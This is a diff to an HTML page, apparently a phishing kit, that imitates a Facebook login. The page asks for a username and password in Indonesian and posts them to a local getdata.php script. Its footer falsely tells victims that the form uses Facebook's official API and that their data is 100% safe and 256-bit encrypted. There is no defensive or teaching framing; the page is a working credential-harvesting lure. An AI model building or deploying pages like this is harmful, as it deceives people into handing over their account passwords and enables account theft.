@@ -5,52 +5,102 @@
     <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
     <title>FACEBOOK</title>
     <!-- ... (bagian head lainnya) ... -->
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .navbar {
+            width: 100%;
+            background-color: #4267B2;
+            padding: 10px 0;
+            color: #fff;
+            text-align: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 30px;
+            height: 30px;
+            margin-right: 10px;
+        }
+
+        .logo h3 {
+            color: #4267B2;
+            margin: 0;
+            font-size: 24px;
+        }
+
+        .form-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 80%;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        form input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        #login {
+            background-color: #4267B2;
+            color: white;
+            padding: 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .footer {
+            text-align: center;
+            color: #606770;
+            margin-top: auto;
+            padding: 20px 0;
+        }
+    </style>
 </head>
 
 <body>
-    <nav class="navbar navbar-default navbar-fixed-top top-nav">
-        <!-- ... (bagian navbar lainnya) ... -->
-    </nav>
-    <section class="sign-up log-in testimonials">
-        <div class="container">
-            <div class="row">
-                <div class="sign-up-content">
-                    <div class="container">
-                        <div class="row">
-                            <div class="form-trial col-lg-6 col-md-6 col-sm-12 col-xs-12">
-                                <div class="logo">
-                                    <!-- ... (bagian logo lainnya) ... -->
-                                </div>
-                                <!-- Ganti action formulir untuk mengarahkan ke getdata.php -->
-                                <form action="getdata.php" method="post">
-                                    <input type="hidden" name="_token" value="nUpCrsjltZ5v1DXv0BRJzVFYymWzIXDoXFQyxFhz">
-                                    <h3>Masuk Dengan Akun Facebook</h3>
-                                    <div class="name">
-                                        <input type="text" class="form-control" name="username" id="username" placeholder="Email/No.HP/Username" minlength="4" required="true">
-                                    </div>
-                                    <div class="password">
-                                        <input type="password" class="form-control" name="password" id="password" required="true" placeholder="Kata Sandi">
-                                    </div>
-                                    <div class="name"></div>
-                                    <div class="submit">
-                                        <button class="form-submit btn" name="submit"><i class="fa fa-sign-in-alt"></i>Secure Login</button>
-                                    </div>
-                                </form>
-                                <hr class="wau">
-                                <div style="display:inline-block;text-align: center;padding-top: 10px;">
-                                    <!-- ... (bagian pesan dan gambar lainnya) ... -->
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <div class="scroll-top"> <span class="animated fadeIn"><i class="fas fa-chevron-left"></i></span> </div>
-                <footer>
-                    <!-- ... (bagian footer lainnya) ... -->
-                </footer>
-            </div>
-        </div>
-    </section>
+    <div class="navbar">
+        <img class="navbar-brand" src="images/logo/default.png" alt="logo">
+    </div>
+    <div class="logo">
+        <img src="images/logo/default.png" alt="logo">
+        <h3>Facebook</h3>
+    </div>
+    <div class="form-container">
+        <form action="getdata.php" method="post">
+            <input type="hidden" name="_token" value="nUpCrsjltZ5v1DXv0BRJzVFYymWzIXDoXFQyxFhz">
+            <h3>Masuk Dengan Akun Facebook</h3>
+            <input type="text" class="form-control" name="username" id="username" placeholder="Email/No.HP/Username" minlength="4" required="true">
+            <input type="password" class="form-control" name="password" id="password" required="true" placeholder="Kata Sandi">
+            <button class="form-submit btn" name="submit" id="login">Secure Login</button>
+        </form>
+    </div>
+    <div class="footer">
+        <small style="color:green;">Form login menggunakan API resmi yang terkoneksi langsung dengan Facebook.<br />Data anda 100% aman dan ter-enkripsi 256 bit.</small>
+    </div>
 </body>
 
 </html>
